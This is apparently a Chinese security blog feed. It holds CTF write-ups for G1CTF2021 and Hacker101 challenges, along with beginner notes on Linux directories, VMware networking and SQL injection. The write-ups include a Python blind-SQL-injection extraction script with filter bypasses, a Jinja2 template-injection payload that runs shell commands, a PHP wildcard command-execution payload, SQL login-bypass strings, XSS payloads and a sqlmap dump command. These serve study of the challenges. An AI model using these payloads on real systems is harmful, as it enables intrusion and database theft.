<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">length() 函数 返回字符串的长度</span><br><span class="line"></span><br><span class="line">substr() 截取字符串 （语法:SUBSTR(str,pos,len);） </span><br><span class="line"></span><br><span class="line">ascii() 返回字符的ascii码   [将字符变为数字wei]</span><br><span class="line"></span><br><span class="line">sleep() 将程序挂起一段时间n为n秒</span><br><span class="line"></span><br><span class="line">if(expr1,expr2,expr3) 判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句	</span><br></pre></td></tr></table></figure>

<p><strong>burp Fuzz</strong>一下</p>
<p>Sql fuzz字典地址: <a href="https://github.com/TheKingOfDuck/fuzzDicts/blob/master/sqlDict/sql.txt">https://github.com/TheKingOfDuck/fuzzDicts </a></p>
<p>里面<a href="https://github.com/TheKingOfDuck/fuzzDicts/tree/master/sqlDict">sqlDict</a>文件夹里面的<strong>sql.txt</strong></p>
<p><img src="https://image.3001.net/images/20210529/1622273460_60b1edb4cbb7e0e17c533.png!small" alt="1622273460_60b1edb4cbb7e0e17c533.png!small"></p>
<p>符号202的表示过滤了</p>
<p>过滤了  <strong>空格,substr,and,||</strong></p>
<p>用 <strong>mid绕substr，or 绕and， /**/绕空格</strong></p>
<p>上脚本用2分法效率高:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import urllib.parse</span><br><span class="line">def sqlinjet(url,payload):</span><br><span class="line">    header=&#123;</span><br><span class="line">        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&#x27;,</span><br><span class="line">        &#x27;Cookie&#x27;: &quot;session=1ac6a561-26db-4c79-a123-a064f3bdec2b.13jA8tDgWvoOxZN007VHA3-AXsw&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">            &#125;</span><br><span class="line">    flag=&#x27;&#x27;</span><br><span class="line">    for i in range(1,200):</span><br><span class="line">        low = 32</span><br><span class="line">        high = 128</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">        while(low &lt; high):</span><br><span class="line">            data = &#123;</span><br><span class="line">                &#x27;id&#x27;: payload.format(i,mid),</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url=url,data=data,headers=header)</span><br><span class="line">            print(data)</span><br><span class="line">            if &#x27;search success&#x27; in r.text:</span><br><span class="line">               low = mid + 1</span><br><span class="line">            else:</span><br><span class="line">               high = mid</span><br><span class="line">            mid = (low + high) // 2</span><br><span class="line">        flag += chr(mid)</span><br><span class="line">        print(flag)</span><br><span class="line">        if mid == 32 or mid == 132:</span><br><span class="line">            break</span><br><span class="line">url=&#x27;http://10.1.5.252:28002/index.php&#x27;</span><br><span class="line">#查所有的库</span><br><span class="line">payload_all_database=&quot;-1/**/or/**/ascii(mid((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span><br><span class="line">#查当前的库</span><br><span class="line">payload_database=&quot;-1/**/or/**/ascii(mid((select/**/database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span><br><span class="line">#查表</span><br><span class="line">payload_table=&quot;-1/**/or/**/ascii(mid((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span><br><span class="line">#emails,flag,referers,uagents,users</span><br><span class="line">#查列</span><br><span class="line">payload_column=&quot;-1/**/or/**/ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;users&#x27;),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span><br><span class="line">#id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">#查字段值</span><br><span class="line">flag=&quot;-1/**/or/**/ascii(mid((select/**/group_concat(password)/**/from/**/users),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span><br><span class="line">sqlinjet(url,flag)</span><br></pre></td></tr></table></figure>

<p>得<strong>flag:</strong></p>
<p> <img src="https://image.3001.net/images/20210529/1622275797_60b1f6d5670e17370daae.png!small" alt="1622275797_60b1f6d5670e17370daae.png!small"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>G1CTF2021</category>
      </categories>
      <tags>
        <tag>G1CTF2021</tag>
      </tags>
  </entry>
  <entry>
    <title>G1CTF2021 i_want_to_rce</title>
    <url>/2021/07/05/G1CTF2021-i-want-to-rce/</url>
    <content><![CDATA[<p>访问网址显示内容如下:</p>
<p><img src="https://image.3001.net/images/20210527/1622098597_60af42a5e19348b39f48e.png!small?1622098595141" alt="1622098597_60af42a5e19348b39f48e.png!small?1622098595141"></p>
<span id="more"></span>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#x27;code&#x27;]))&#123;                          #code参数highlight_file(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;       #绕过正则die(&#x27;fighting!&#x27;); </span><br><span class="line">    &#125;</span><br><span class="line">    system($code);                                  #输出flag&#125;主要考查PHP代码审计和绕过规则</span><br></pre></td></tr></table></figure>

<p>该题和津门杯hate_php很类似</p>
<!--more-->

<p><img src="https://image.3001.net/images/20210527/1622101436_60af4dbc80464fb8d6649.png!small?1622101433438" alt="1622101436_60af4dbc80464fb8d6649.png!small?1622101433438"></p>
<p>不同的地方就是函数<strong>eval(),system()</strong></p>
<p><strong>eval类型函数是代码执行     system类型函数是命令执行 不需要闭合</strong></p>
<p>绕过原理:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:?code=.%20/???/????????[@-[]</span><br></pre></td></tr></table></figure>

<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
<p><img src="https://image.3001.net/images/20210527/1622100937_60af4bc97bd26df61ae01.png!small?1622100934463" alt="1622100937_60af4bc97bd26df61ae01.png!small?1622100934463"></p>
<p>该题的PHP版本是<strong>5.6</strong></p>
<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>1.打开本地服务器phpStudy</p>
<p>2.在根目录下一般是  <strong>\phpStudy\WWW</strong> 创建一个 <strong>.txt</strong>文件</p>
<p>写一个文件上传php代码  然后改成 <strong>.html</strong>文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://10.1.5.252:2333/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210527/1622102539_60af520b70721eba5d00d.png!small?1622102536372" alt="1622102539_60af520b70721eba5d00d.png!small?1622102536372"></p>
<p>上传一个 <strong>.txt</strong>文件写上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p>3.抓返回包</p>
<p><img src="https://image.3001.net/images/20210527/1622102973_60af53bde7b5ad0275597.png!small?1622102971022" alt="1622102973_60af53bde7b5ad0275597.png!small?1622102971022"></p>
<p>然后**cat,**得到flag</p>
<p> <img src="https://image.3001.net/images/20210527/1622103092_60af54349b3c4f8de178a.png!small?1622103089727" alt="1622103092_60af54349b3c4f8de178a.png!small?1622103089727"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>G1CTF2021</category>
      </categories>
      <tags>
        <tag>G1CTF2021</tag>
      </tags>
  </entry>
  <entry>
    <title>G1CTF2021 SSTI</title>
    <url>/2021/07/05/G1CTF2021-SSTI/</url>
    <content><![CDATA[<p>访问网址显示内容如下:</p>
<p><img src="https://image.3001.net/images/20210530/1622374633_60b378e9207daea38504d.png!small" alt="1622374633_60b378e9207daea38504d.png!small"></p>
<p>输入49发现回显了49</p>
<span id="more"></span>

<p><img src="https://image.3001.net/images/20210530/1622374776_60b37978dc3104735bc4d.png!small" alt="1622374776_60b37978dc3104735bc4d.png!small"></p>
<p><strong>模板注入 。</strong></p>
<p>模板注入解析:  <a href="https://xz.aliyun.com/t/7746">https://xz.aliyun.com/t/7746</a></p>
<p>这里就不多解释了直接上payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;%if%20c.__name__==&#x27;catch_warnings&#x27;%27&#x27;%&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210530/1622376727_60b381170a65dc8580eb0.png!small" alt="1622376727_60b381170a65dc8580eb0.png!small"></p>
<p>测试可知<strong>过滤flag</strong>,命令执行绕过得FLAG:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;%if%20c.__name__==&#x27;catch_warnings&#x27;%27&#x27;%&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /fla&#x27;&#x27;g&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>G1CTF2021</category>
      </categories>
      <tags>
        <tag>G1CTF2021</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统文件的结构</title>
    <url>/2021/07/05/Linux%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h2 id="文件路径"><a href="#文件路径" class="headerlink" title="文件路径"></a>文件路径</h2><h3 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h3><p>   文件在硬盘上<strong>真正存在</strong>的路径。</p>
<p>​     如:/etc/init/  (看到/开头就是liunx的绝对路径了)</p>
<p>​        C:\Users\Admin.android\avd （看到盘符就绝对是WINDOWS绝对路径了)</p>
<h3 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h3><span id="more"></span>

<p>   自己相对与目标位置。</p>
<p>假设 你要引入文件的页面名称为test.htm,它存在叫www的文件夹里（绝对路径D:/wamp/www/test.htm）</p>
<p>那么引用同时存在www文件夹里的“icon.jpg”文件（绝对路径D:/wamp/www/icon.jpg)</p>
<p>同一目录下相对路径icon.jpg （./icon.jpg  ../）</p>
<p>如果文件“icon.jpg”存在img文文件夹中（绝对路径D:/wamp/www/img/icon.jpg),那么相对路径./img/icon.jpg。</p>
<h2 id="查看系统文件目录"><a href="#查看系统文件目录" class="headerlink" title="查看系统文件目录"></a>查看系统文件目录</h2><p>登录系统后在命令窗输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210525/1621945396_60acec34a72df81d3def8.png!small?1621945395271" alt="1621945396_60acec34a72df81d3def8.png!small?1621945395271"></p>
<p>树形结构图</p>
<p><img src="https://image.3001.net/images/20210525/1621945418_60acec4a3ccfce64ffbde.png!small?1621945416855" alt="1621945418_60acec4a3ccfce64ffbde.png!small?1621945416855"></p>
<h3 id="主要目录解析："><a href="#主要目录解析：" class="headerlink" title="主要目录解析："></a>主要目录解析：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1./bin基础系统所需要的命令位于此目录，例如:ls, mount,cp, mkdir等等；这个目录中的文件都是可执行的，一般的用户都可以使用。2./boot包含Linux内核及系统引导程序所需要的文件,包括连接文件以及镜像文件。</span><br><span class="line"></span><br><span class="line">3./dev设备文件存储目录,这些不是常规文件,而是指系统上的各种硬件设备,包括硬盘驱动器</span><br><span class="line"></span><br><span class="line">4./etc存放系统程序或者一般工具的配置文件,配置文件会影响系统所有用户的系统环境。</span><br><span class="line"></span><br><span class="line">5./home普通用户默认存放目录 Linux 是多用户环境，所以每一个用户都有一个只有自己可以访问的目录（当然管理员也可以访问）。</span><br><span class="line"></span><br><span class="line">6./lib库文件存放目录这里包含了系统程序所需要的所有共享库文件,其作用类似于Windows里的DLL文件。</span><br><span class="line"></span><br><span class="line">7./lost+found：一般情况下为空的，系统非法关机后，这里就存放一些文件</span><br><span class="line"></span><br><span class="line">8./media即插即用型存储设备的挂载点自动在这个目录下创建</span><br><span class="line"></span><br><span class="line">9./mnt这个目录一般是用于存放挂载储存设备的挂载目录的</span><br><span class="line"></span><br><span class="line">10./opt表示的是可选择的意思，有些软件包也会被安装在这里，也就是自定义软件包。这个 目录包含所有默认系统安装之外的软件和添加的包。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Kali linux</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware无法上网问题</title>
    <url>/2021/07/05/VMware%E6%97%A0%E6%B3%95%E4%B8%8A%E7%BD%91%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>VM虚拟机<strong>没有网络</strong>几乎啥 啥都弄不了,现在让我们一起来<strong>解决</strong>这个问题叭！！！</p>
<h2 id="判断能否上网的方法"><a href="#判断能否上网的方法" class="headerlink" title="判断能否上网的方法"></a>判断能否上网的方法</h2><span id="more"></span>

<p>1.直接在看<strong>网络管理器小程序</strong>一般在虚拟机的<strong>右上角</strong>:</p>
<p>(鼠标<strong>轻轻放在上面</strong>就能看到有无网络连接)</p>
<p><img src="https://image.3001.net/images/20210531/1622463590_60b4d466256ad79ba924e.png!small?1622463590222" alt="1622463590_60b4d466256ad79ba924e.png!small?1622463590222"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.ping baidu.com</span><br><span class="line">3.ping 8.8.8.8(是Google提供的免费DNS服务器的IP地址)</span><br><span class="line">4.ping 网关</span><br></pre></td></tr></table></figure>

<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>1）:点击左上角的”编辑”选中”虚拟网络编辑器”;</p>
<p>2）:点击”更改设置”获得管理员的权限来修改网络配置;</p>
<p><img src="https://image.3001.net/images/20210531/1622465225_60b4dac90eab69f727680.png!small?1622465225002" alt="1622465225_60b4dac90eab69f727680.png!small?1622465225002"></p>
<p>3）:单击左下角的”还原默认设置“;</p>
<p><img src="https://image.3001.net/images/20210531/1622467402_60b4e34a8c4319d0ba32c.png!small?1622467402405" alt="1622467402_60b4e34a8c4319d0ba32c.png!small?1622467402405"></p>
<p>4）:在在自定义中选中<strong>VMnet1</strong>/<strong>VMnet8</strong>或<strong>其他的模式</strong>；</p>
<p><img src="https://image.3001.net/images/20210531/1622467491_60b4e3a363b7c457fb60e.png!small?1622467491292" alt="1622467491_60b4e3a363b7c457fb60e.png!small?1622467491292"></p>
<p>5）:”<strong>确定</strong>“后，<strong>开启</strong>虚拟机就有网络了。。</p>
<blockquote>
<p>注:   若执行完以上步骤网络没通的话,就得用以下的方法来解决问题了</p>
</blockquote>
<p>1）:进入设置选中“<strong>桥接模式</strong>”在选中“<strong>复制物理网络</strong>”</p>
<p><img src="https://image.3001.net/images/20210531/1622468436_60b4e754c64074e90eef0.png!small?1622468436845" alt="1622468436_60b4e754c64074e90eef0.png!small?1622468436845"></p>
<p>2）:<strong>开机</strong></p>
<p><strong>总结</strong>:<strong>一般的自定义里面显示的什么方式,选择对应的方式即可上网。</strong></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Kali linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Hacker101 CTF Writeup</title>
    <url>/2021/07/10/Hacker101-CTF-Writeup/</url>
    <content><![CDATA[<h2 id="Hacker101-CTF-背景"><a href="#Hacker101-CTF-背景" class="headerlink" title="Hacker101 CTF 背景"></a>Hacker101 CTF 背景</h2><p>Hacker101 CTF是一款旨在让您在安全、有益的环境中学习黑客攻击的游戏。 <a href="https://www.hacker101.com/">Hacker101</a>是一个免费的黑客教育网站，由<a href="https://www.hackerone.com/">HackerOne 运营</a>。</p>
<p>Hacker101 CTF 分为不同的级别，每个级别都包含一定数量的标志。你可以按照你想要的任何顺序来玩关卡。</p>
<span id="more"></span>

<h2 id="A-little-something-to-get-you-started"><a href="#A-little-something-to-get-you-started" class="headerlink" title="A little something to get you started"></a>A little something to get you started</h2><p>访问网址显示内容如下:</p>
<p><img src="https://image.3001.net/images/20210530/1622370828_60b36a0cb8315b49ecdd2.png!small?1622370828394" alt="1622370828_60b36a0cb8315b49ecdd2.png!small?1622370828394"></p>
<p>查看源码,找到一张图片</p>
<p><img src="https://image.3001.net/images/20210530/1622370882_60b36a424c12ea9f01f57.png!small?1622370881966" alt="1622370882_60b36a424c12ea9f01f57.png!small?1622370881966"></p>
<p>访问这张图得到标志FLAG</p>
<p><img src="https://image.3001.net/images/20210530/1622371176_60b36b68e486793b25919.png!small?1622371176510" alt="1622371176_60b36b68e486793b25919.png!small?1622371176510"></p>
<h2 id="Micro-CMS-v1"><a href="#Micro-CMS-v1" class="headerlink" title="Micro-CMS v1"></a><strong>Micro-CMS v1</strong></h2><p>访问网址显示内容如下:</p>
<p><img src="https://image.3001.net/images/20210531/1622458562_60b4c0c21334a21cb19ee.png!small?1622458561975" alt="1622458562_60b4c0c21334a21cb19ee.png!small?1622458561975"></p>
<h3 id="FLAG-0"><a href="#FLAG-0" class="headerlink" title="FLAG 0"></a>FLAG 0</h3><p>进入<strong>编辑页面</strong></p>
<p><img src="https://image.3001.net/images/20210531/1622458723_60b4c1638352794da181f.png!small?1622458723433" alt="1622458723_60b4c1638352794da181f.png!small?1622458723433"></p>
<p>修改ID<strong>值</strong>得到FLAG: (注:ID值可能不一样,1-9试一下就好啦)</p>
<p><img src="https://image.3001.net/images/20210531/1622459000_60b4c278180fc95a6a9b4.png!small?1622459000027" alt="1622459000_60b4c278180fc95a6a9b4.png!small?1622459000027"></p>
<h3 id="FLAG1"><a href="#FLAG1" class="headerlink" title="FLAG1"></a>FLAG1</h3><p>在编辑页面测试<strong>SQL注入漏洞</strong>时,在 URL 中添加<strong>引号</strong>得到了FALG:</p>
<p><img src="https://image.3001.net/images/20210531/1622459562_60b4c4aad5312383c2588.png!small?1622459562807" alt="1622459562_60b4c4aad5312383c2588.png!small?1622459562807"></p>
<h3 id="FLAG2"><a href="#FLAG2" class="headerlink" title="FLAG2"></a><strong>FLAG2</strong></h3><p>存储型 XSS 漏洞,在编辑页面的标题和内容里插入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert`xss`&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210531/1622460398_60b4c7ee062f6b3e1db31.png!small?1622460397989" alt="1622460398_60b4c7ee062f6b3e1db31.png!small?1622460397989"></p>
<p>Save 然后<strong>go home</strong>会有<strong>弹窗</strong>FLAG</p>
<p><img src="https://image.3001.net/images/20210531/1622460693_60b4c9150bdb22300e275.png!small?1622460692984" alt="1622460693_60b4c9150bdb22300e275.png!small?1622460692984"></p>
<h3 id="FLAG3"><a href="#FLAG3" class="headerlink" title="FLAG3"></a>FLAG3</h3><p>在编辑页面的框里填</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button onclick=alert(1)&gt;Some button&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<p>：<img src="https://image.3001.net/images/20210531/1622460960_60b4ca20a1d24cac4f9e2.png!small?1622460960589" alt="1622460960_60b4ca20a1d24cac4f9e2.png!small?1622460960589"></p>
<p>然后在检查源码得到FLAG:</p>
<p><img src="https://image.3001.net/images/20210531/1622461372_60b4cbbc4ab7df1f41a59.png!small?1622461372250" alt="1622461372_60b4cbbc4ab7df1f41a59.png!small?1622461372250"></p>
<h2 id="Micro-CMS-v2"><a href="#Micro-CMS-v2" class="headerlink" title="Micro-CMS v2"></a>Micro-CMS v2</h2><h3 id="FLAG0-》绕过登录"><a href="#FLAG0-》绕过登录" class="headerlink" title="FLAG0==》绕过登录"></a>FLAG0==》绕过登录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名：&#x27; UNION SELECT &#x27;123&#x27; AS password#</span><br><span class="line">密码：     123</span><br><span class="line">SELECT password FROM admins WHERE username = &#x27; admin &#x27;  UNION  SELECT  &#x27; 123 &#x27;  AS password #</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210602/1622638893_60b7812d004809a6591af.png!small?1622638892676" alt="1622638893_60b7812d004809a6591af.png!small?1622638892676"></p>
<h3 id="FLAG1-》POST传参"><a href="#FLAG1-》POST传参" class="headerlink" title="FLAG1==》POST传参"></a>FLAG1==》POST传参</h3><blockquote>
<p><strong>退出登录</strong>，直接编辑页面 即后面加 去掉home加page/edit/1,然后以POST传参URL</p>
<p>工具 <strong>hackbar</strong></p>
</blockquote>
<p><img src="https://image.3001.net/images/20210602/1622640468_60b7875485d38c4859109.png!small?1622640468203" alt="1622640468_60b7875485d38c4859109.png!small?1622640468203"></p>
<h3 id="FLAG2-》密码爆破"><a href="#FLAG2-》密码爆破" class="headerlink" title="FLAG2==》密码爆破"></a>FLAG2==》密码爆破</h3><p><strong>万能密码</strong>绕过用户名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1#</span><br></pre></td></tr></table></figure>

<p><strong>burp爆破密码</strong>(注：每个人的密码不相同哦)</p>
<p><img src="https://image.3001.net/images/20210602/1622641074_60b789b22dc631e15b050.png!small?1622641074344" alt="1622641074_60b789b22dc631e15b050.png!small?1622641074344"></p>
<h2 id="Encrypted-Pastebin"><a href="#Encrypted-Pastebin" class="headerlink" title="Encrypted Pastebin"></a>Encrypted Pastebin</h2><h3 id="FLAG0"><a href="#FLAG0" class="headerlink" title="FLAG0"></a><strong>FLAG0</strong></h3><p>1.先尝试POST传参</p>
<p><img src="https://image.3001.net/images/20210611/1623409412_60c34304561d67a867af7.png!small?1623409410794" alt="1623409412_60c34304561d67a867af7.png!small?1623409410794"></p>
<p><img src="https://image.3001.net/images/20210611/1623409423_60c3430fa570b171dde6e.png!small?1623409422106" alt="1623409423_60c3430fa570b171dde6e.png!small?1623409422106"></p>
<p>   <strong>看到URL上有个Post传参，然后进行注入测试,没想到得到个FLAG</strong><img src="https://image.3001.net/images/20210611/1623409995_60c3454b60285b2dc5e2b.png!small?1623409993852" alt="1623409995_60c3454b60285b2dc5e2b.png!small?1623409993852"></p>
<h2 id="Photo-Gallery"><a href="#Photo-Gallery" class="headerlink" title="Photo Gallery"></a>Photo Gallery</h2><h3 id="FLAG0-1"><a href="#FLAG0-1" class="headerlink" title="FLAG0"></a>FLAG0</h3><p>查看网页源码发现图片都是以  “<strong>fetch?id=</strong> “  加载的</p>
<p>简单测试 发现存在SQL注入</p>
<p>直接上 Salmap 得到f lag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://35.227.24.107/d7f2b886cc/fetch?id=1&quot; --method=GET --dump -D level5 -T photos -p id --code=200 --ignore-code=500 --skip-waf --threads=2 -o</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210819/1629368618_611e312aa006520200114.png!small" alt="img"></p>
<h2 id="Cody’s-First-Blog"><a href="#Cody’s-First-Blog" class="headerlink" title="Cody’s First Blog"></a>Cody’s First Blog</h2><h3 id="FLAG0-2"><a href="#FLAG0-2" class="headerlink" title="FLAG0"></a>FLAG0</h3><p>该博客构建用了 PHP语言，并有个评论发表区域，</p>
<p>试着写上代码提交</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php echo phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="/.io//Users\ASUS\Desktop\QQ截图20210818215331.png" alt="QQ截图20210818215331"></p>
<h3 id="FLAG1-1"><a href="#FLAG1-1" class="headerlink" title="FLAG1"></a>FLAG1</h3><p>查看主页网站源码发现代码段</p>
<p><img src="/.io//Users\ASUS\Desktop\题目\Snipaste_2021-08-19_11-12-58.png" alt="Snipaste_2021-08-19_11-12-58"></p>
<p>试着直接在 URL 后面加上 代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://34.94.3.143/fced531d14/?page=admin.auth.inc</span><br></pre></td></tr></table></figure>

<p>发现一个登录框</p>
<p><img src="/.io//Users\ASUS\Desktop\1.png" alt="1"></p>
<p>先试着输入弱密码  无果</p>
<p>然后输入万能密码  无果</p>
<p>然后 爆破 无果</p>
<p>可能思路错了</p>
<p>返回主页面发现这里用了  include()函数的功能  </p>
<p>并且刚刚的参数  <strong>?page=admin.auth.inc</strong>  是登录用的 PHP</p>
<p>然后试着改为 <strong>?page=admin.inc</strong>  </p>
<p>发现就可以 绕过了 登录 直接进入 Admin页面</p>
<p>得到flag</p>
<p><img src="/.io//Users\ASUS\Desktop\Snipaste_2021-08-19_11-38-31.png" alt="Snipaste_2021-08-19_11-38-31"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Hacker101 CTF</category>
      </categories>
      <tags>
        <tag>Hacker101 CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入原理分析</title>
    <url>/2021/07/13/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h2 id="SQL注入的本质"><a href="#SQL注入的本质" class="headerlink" title="SQL注入的本质"></a>SQL注入的本质</h2><blockquote>
<p>注入攻击的<strong>本质: 把用户输入的数据当做代码执行</strong>。</p>
<p>两个关键条件：</p>
<p>第一个是用户能够控制输入</p>
<p>第二个是原本程序要执行的代码，拼接了用户输入的数据然后进行执行</p>
</blockquote>
<p>针对<strong>SQL语句的注入</strong>，也可以理解为用户输入的数据当做<strong>SQL语句的代码执行</strong></p>
<span id="more"></span>

<h2 id="显错注入-联合查询（Mysql数据库）的基本流程"><a href="#显错注入-联合查询（Mysql数据库）的基本流程" class="headerlink" title="显错注入-联合查询（Mysql数据库）的基本流程"></a>显错注入-联合查询（Mysql数据库）的基本流程</h2><p><img src="https://image.3001.net/images/20210609/1623234067_60c0961324ec42331fc35.png!small?1623234067968" alt="1623234067_60c0961324ec42331fc35.png!small?1623234067968"></p>
<blockquote>
<p>重要知识点: <strong>通过系统自带库查询数据</strong></p>
<p>通过系统自带库查询数据 Mysql在5.0以上版本加入了<strong>information_schema</strong> 这个系统自带库</p>
<p>其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等</p>
<p><strong>information_schema.tables</strong>存放表名和库名的对应</p>
<p><strong>information_schema.columns</strong>存放字段名和表名的对应</p>
<p><strong>注： 【information_schema.tables 实际上是选中information_schema库中的tables表】</strong></p>
</blockquote>
<h2 id="显错注入靶场的做法"><a href="#显错注入靶场的做法" class="headerlink" title="显错注入靶场的做法"></a>显错注入靶场的做法</h2><p><strong>1.判断注入点</strong></p>
<blockquote>
<p>最古老的方法：    and 1=1 页面正常    and 1=2  页面不正常</p>
<p>最简单的方法：    页面后面加’,看是否报错</p>
<p>好用的方法：      如果是数字型传参，可以尝试-1</p>
<p>例如：   <a href="http://www.xxx.com/new.php?id=1">http://www.xxx.com/new.php?id=1</a>  页面显示id=1的新闻</p>
<p><a href="http://www.xxx.com/new.php?id=2-1">http://www.xxx.com/new.php?id=2-1</a>  页面显示id=1的新闻</p>
<p>and 1=1 and 1=2 被拦截的可能性太高了</p>
<p>可以尝试 and -1=-1 and -1=-2 and 1&gt;0  or 1=1</p>
<p>或者直接 or sleep(5)</p>
<p><strong>2. 判断当前页面字段总数</strong></p>
<p>and 1=1 order by 1,2,3,4,5……</p>
<p><strong>3.判断显示位</strong> </p>
<p>and 1=2 union select 1,2,3,4,5,6,7……</p>
<p><strong>4.查当前数据库</strong> </p>
<p>and 1=2 union select 1,2,database()</p>
